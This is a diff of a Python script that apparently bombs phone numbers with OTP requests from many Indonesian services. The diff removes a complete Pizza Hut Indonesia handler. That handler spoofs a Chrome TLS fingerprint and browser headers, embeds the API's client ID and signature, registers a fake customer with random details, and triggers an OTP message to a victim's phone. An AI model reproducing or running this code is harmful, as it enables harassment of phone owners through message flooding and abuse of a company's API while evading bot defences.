@@ -864,64 +864,6 @@ def send_tokopedia_otp(phone_08):
         return None
 
 # ==================== HANDLER 28: PIZZAHUT ====================
-import tls_client as _tls_client
-
-_PH_BASE      = "https://api-prod.pizzahut.co.id"
-_PH_SIGNATURE = "ae5ac5c8c7c217aa0e277eaec9b2589878a27dd49b2310b621cdf613d055c314"
-_PH_CLIENT_ID = "b39773b0-435b-4f41-80e9-163eef20e0ab"
-
-def send_pizzahut_otp(phone_input):
-    p = normalize(phone_input)
-    bare = p['bare']  # 8xxxxxxxxx
-
-    device_id = f"{uuid.uuid4().hex[:8]}-{uuid.uuid4().hex[:6]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:6]}"
-    session = _tls_client.Session(client_identifier="chrome_131", random_tls_extension_order=True)
-
-    headers = {
-        "accept":             "application/json",
-        "accept-encoding":    "gzip, deflate, br, zstd",
-        "accept-language":    "id,en-US;q=0.9,en;q=0.8",
-        "content-type":       "application/x-www-form-urlencoded",
-        "origin":             "https://www.pizzahut.co.id",
-        "priority":           "u=1, i",
-        "referer":            "https://www.pizzahut.co.id/",
-        "sec-ch-ua":          '"Not:A-Brand";v="8", "Chromium";v="131", "Google Chrome";v="131"',
-        "sec-ch-ua-mobile":   "?0",
-        "sec-ch-ua-platform": '"Windows"',
-        "sec-fetch-dest":     "empty",
-        "sec-fetch-mode":     "cors",
-        "sec-fetch-site":     "same-site",
-        "user-agent":         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-        "x-channel":          "2",
-        "x-client-id":        _PH_CLIENT_ID,
-        "x-device-id":        device_id,
-        "x-device-type":      "PC",
-        "x-lang":             "en",
-        "x-platform":         "WEBDESKTOP",
-        "x-signature":        _PH_SIGNATURE,
-    }
-
-    payload = {
-        "birthday":   f"{random.randint(1990,2002)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}",
-        "email":      ''.join(random.choices(string.ascii_lowercase, k=8)) + "@gmail.com",
-        "first_name": ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize(),
-        "last_name":  ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize(),
-        "phone":      bare,
-    }
-
-    try:
-        reg = session.post(f"{_PH_BASE}/customer/v5/customer/register", headers=headers, data=payload, timeout_seconds=15)
-        if reg.status_code == 200:
-            data = reg.json()
-            key = (data.get("key") or (data.get("data") or {}).get("key") or (data.get("result") or {}).get("key"))
-            if key:
-                otp_payload = {"key": key, "type": 1}
-                otp_headers = {**headers, "content-type": "application/json"}
-                otp = session.post(f"{_PH_BASE}/customer/v1/customer/send-otp", headers=otp_headers, json=otp_payload, timeout_seconds=15)
-                return otp.status_code, otp.text
-        return reg.status_code, reg.text
-    except Exception as e:
-        return None, str(e)
 
 # ==================== HANDLER 29: MAPCLUB ====================
 _MC_BASE        = "https://beryllium.mapclub.com"
